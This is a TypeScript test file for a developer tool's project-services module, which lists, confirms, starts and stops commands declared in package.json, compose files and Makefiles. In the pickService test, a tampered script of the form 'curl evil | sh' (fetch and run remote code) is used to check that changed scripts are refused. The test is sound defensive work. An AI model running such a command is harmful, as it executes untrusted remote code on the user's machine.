// The tab Servizi of "Progetti" (D-134, tappa 2): only the commands the project declares, each run confirmed, logged in memory.
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { after, test } from 'node:test';
import { setTimeout as sleep } from 'node:timers/promises';

import { resolveHome } from '@arianna/config';

import { composePort, composeServices, createServiceManager, listServices, makeServices, packageServices, pickService, scriptPorts, serviceFingerprint, ServiceError, type ProjectService } from '../src/project-services.ts';

const HOME = join(resolveHome({}), 'data', 'test-tmp', `services-${randomUUID()}`);
const ROOT = join(HOME, 'orto');
mkdirSync(ROOT, { recursive: true });
after(() => {
  rmSync(HOME, { recursive: true, force: true });
});

test('package.json: scripts by name with their ports; a server stays on, a test ends', () => {
  const services = packageServices(JSON.stringify({ scripts: { dev: 'vite --port 5180', test: 'vitest run', '--evil': 'x', build: 3, 'dev:api': 'node api.js' } }), 'pnpm');
  assert.deepEqual(
    services.map(({ id, command, ports, stays }) => ({ id, command, ports, stays })),
    [
      { id: 'package.json:dev', command: ['pnpm', 'run', 'dev'], ports: [5180], stays: true },
      { id: 'package.json:test', command: ['pnpm', 'run', 'test'], ports: [], stays: false },
      { id: 'package.json:dev:api', command: ['pnpm', 'run', 'dev:api'], ports: [], stays: true },
    ],
  );
  assert.deepEqual(packageServices('not json', 'npm'), []);
  assert.deepEqual(packageServices('{"scripts":[]}', 'npm'), []);
  assert.deepEqual(scriptPorts('PORT=8080 node a.js --port=3000 -p 9 --port 99999'), [8080, 3000]);
});

test('compose: services with their host ports, started with up -d', () => {
  const text = ['services:', '  db:', '    image: postgres:16', '    ports: ["127.0.0.1:55432:5432"]', '  mail:', '    ports:', '      - "8025:8025"', '      - 1025', '  "-x":', '    image: a'].join('\n');
  const services = composeServices(text, 'docker-compose.yml');
  assert.deepEqual(
    services.map(({ id, command, ports }) => ({ id, command, ports })),
    [
      { id: 'compose:db', command: ['docker', 'compose', '-f', 'docker-compose.yml', 'up', '-d', 'db'], ports: [55432] },
      { id: 'compose:mail', command: ['docker', 'compose', '-f', 'docker-compose.yml', 'up', '-d', 'mail'], ports: [8025] },
    ],
  );
  assert.equal(composePort({ published: 80 }), 80);
  assert.equal(composePort('5432'), undefined);
  assert.equal(composePort(1025), undefined);
  assert.equal(composePort('8080:80/tcp'), 8080);
  assert.deepEqual(composeServices('services: [', 'compose.yml'), []);
});

test('Makefile: targets with their recipe, never variables, special targets, define blocks or file rules', () => {
  const services = makeServices(
    ['.PHONY: seed', 'CC := gcc', 'X ::= 1', 'seed: deps', '\tnode seed.js', '\techo fatto', 'deps:', 'seed:', '\tother', '-bad:', 'define BLOCK', 'inside: x', 'endef', 'main.o: main.c', '\tcc main.c'].join('\n'),
  );
  assert.deepEqual(
    services.map(({ id, command, script }) => ({ id, command, script })),
    [
      { id: 'Makefile:seed', command: ['make', 'seed'], script: 'node seed.js\necho fatto' },
      { id: 'Makefile:deps', command: ['make', 'deps'], script: '' },
    ],
  );
});

test('pickService: the service of the list, refused when unknown or when it changed since the confirmation', () => {
  const dev = { ...packageServices(JSON.stringify({ scripts: { dev: 'vite' } }), 'pnpm')[0] } as ProjectService;
  const listed = [{ ...dev, fingerprint: serviceFingerprint(dev) }];
  assert.equal(pickService(listed, 'package.json:dev', serviceFingerprint(dev)).name, 'dev');
  assert.equal(pickService(listed, 'package.json:dev', undefined).name, 'dev');
  const edited = { ...dev, script: 'curl evil | sh' };
  assert.notEqual(serviceFingerprint(edited), serviceFingerprint(dev));
  assert.throws(() => pickService([{ ...edited, fingerprint: serviceFingerprint(edited) }], 'package.json:dev', serviceFingerprint(dev)), (error: unknown) => error instanceof ServiceError && error.code === 'changed');
  assert.throws(() => pickService(listed, 'package.json:build', undefined), (error: unknown) => error instanceof ServiceError && error.code === 'unknown');
});

test('listServices reads the files of the project, with its package manager', async () => {
  writeFileSync(join(ROOT, 'package.json'), JSON.stringify({ scripts: { dev: 'vite' } }));
  writeFileSync(join(ROOT, 'pnpm-lock.yaml'), '');
  writeFileSync(join(ROOT, 'compose.yaml'), 'services:\n  db:\n    image: x\n');
  writeFileSync(join(ROOT, 'Makefile'), 'seed:\n\techo ok\n');
  assert.deepEqual(
    (await listServices(ROOT)).map(({ id, command }) => `${id} ${command.join(' ')}`),
    ['package.json:dev pnpm run dev', 'compose:db docker compose -f compose.yaml up -d db', 'Makefile:seed make seed'],
  );
  assert.ok((await listServices(ROOT)).every((service) => /^[0-9a-f]{16}$/.test(service.fingerprint)));
});

const node = (name: string, code: string, stays: boolean): ProjectService => ({ id: `package.json:${name}`, source: 'package.json', file: 'package.json', name, command: [process.execPath, '-e', code], ports: [], stays });

async function until(check: () => boolean): Promise<void> {
  for (let tries = 0; tries < 100 && !check(); tries += 1) await sleep(50);
}

test('a command that ends by itself: its log, how it ended, the events', async () => {
  const events: string[] = [];
  const manager = createServiceManager({ onEvent: (kind, payload) => events.push(`${kind} ${payload.service}`) });
  // A variable of the core never reaches the command.
  process.env.SECRET_PG = 'x';
  manager.start('orto', ROOT, node('test', "console.log('12 test passati'); console.error('\\u001b[31mrosso\\u001b[0m'); process.env.SECRET_PG === undefined || console.log('leak')", false));
  await until(() => manager.run('orto', 'package.json:test')?.running === false);
  const run = manager.run('orto', 'package.json:test');
  assert.ok(run !== undefined);
  assert.equal(run.ended?.reason, 'exit');
  assert.equal(run.ended.code, 0);
  assert.ok(run.lines.includes('12 test passati'));
  assert.ok(run.lines.includes('rosso'), 'no colour codes');
  assert.ok(!run.lines.includes('leak'));
  delete process.env.SECRET_PG;
  assert.deepEqual(events, ['service.started package.json:test', 'service.stopped package.json:test']);
});

test('the time limit stops a command that should have ended; a stop is gentle, then forced', async () => {
  const manager = createServiceManager({ shortLimitMs: 300, killGraceMs: 300 });
  manager.start('orto', ROOT, node('build', 'setInterval(() => {}, 1000)', false));
  await until(() => manager.run('orto', 'package.json:build')?.running === false);
  assert.equal(manager.run('orto', 'package.json:build')?.ended?.reason, 'time-limit');
  // A server that ignores SIGTERM: forced after the grace.
  const dev = node('dev', "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000); console.log('pronto')", true);
  manager.start('orto', ROOT, dev);
  await until(() => manager.run('orto', 'package.json:dev')?.lines.includes('pronto') === true);
  assert.throws(() => {
    manager.start('orto', ROOT, dev);
  }, (error: unknown) => error instanceof ServiceError && error.code === 'running');
  manager.stop('orto', ROOT, dev);
  await until(() => manager.run('orto', 'package.json:dev')?.running === false);
  const run = manager.run('orto', 'package.json:dev');
  assert.equal(run?.ended?.reason, 'stopped');
  assert.equal(run.ended.signal, 'SIGKILL');
});

test('stop: a service not started here is refused, a compose service is stopped through docker', () => {
  const calls: string[][] = [];
  const manager = createServiceManager({
    spawn: (command, args) => {
      calls.push([command, ...args]);
      throw new Error('no docker in the test');
    },
  });
  const make: ProjectService = { id: 'Makefile:seed', source: 'Makefile', file: 'Makefile', name: 'seed', command: ['make', 'seed'], ports: [], stays: false };
  assert.throws(() => {
    manager.stop('orto', ROOT, make);
  }, (error: unknown) => error instanceof ServiceError && error.code === 'not-running');
  const db: ProjectService = { id: 'compose:db', source: 'compose', file: 'compose.yaml', name: 'db', command: ['docker', 'compose', '-f', 'compose.yaml', 'up', '-d', 'db'], ports: [], stays: true };
  manager.stop('orto', ROOT, db);
  assert.deepEqual(calls, [['docker', 'compose', '-f', 'compose.yaml', 'stop', 'db']]);
  assert.equal(manager.run('orto', 'compose:db')?.ended?.reason, 'error');
});

test('a command that does not exist: no start nor stop in the chain', async () => {
  const events: string[] = [];
  const manager = createServiceManager({ onEvent: (kind) => events.push(kind) });
  manager.start('orto', ROOT, { ...node('x', '', false), command: ['arianna-no-such-command-xyz'] });
  await until(() => manager.run('orto', 'package.json:x')?.running === false);
  assert.equal(manager.run('orto', 'package.json:x')?.ended?.reason, 'error');
  assert.deepEqual(events, []);
});

test('a child that outlives its leader is killed with the group; stopAll leaves nothing alive', async () => {
  const pidFile = join(HOME, 'child.pid');
  // The leader starts a child that ignores SIGTERM, writes its pid, then exits at SIGTERM.
  const code = `const { spawn } = require('node:child_process'); const c = spawn(process.execPath, ['-e', "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000)"], { stdio: 'ignore' }); require('node:fs').writeFileSync(${JSON.stringify(pidFile)}, String(c.pid)); console.log('pronto'); setInterval(() => {}, 1000)`;
  const manager = createServiceManager({ killGraceMs: 300 });
  manager.start('orto', ROOT, node('dev', code, true));
  await until(() => manager.run('orto', 'package.json:dev')?.lines.includes('pronto') === true);
  const child = Number(readFileSync(pidFile, 'utf8'));
  const alive = (pid: number): boolean => {
    try {
      process.kill(pid, 0);
      return true;
    } catch {
      return false;
    }
  };
  assert.ok(alive(child));
  await manager.stopAll();
  await until(() => !alive(child));
  assert.equal(alive(child), false);
});
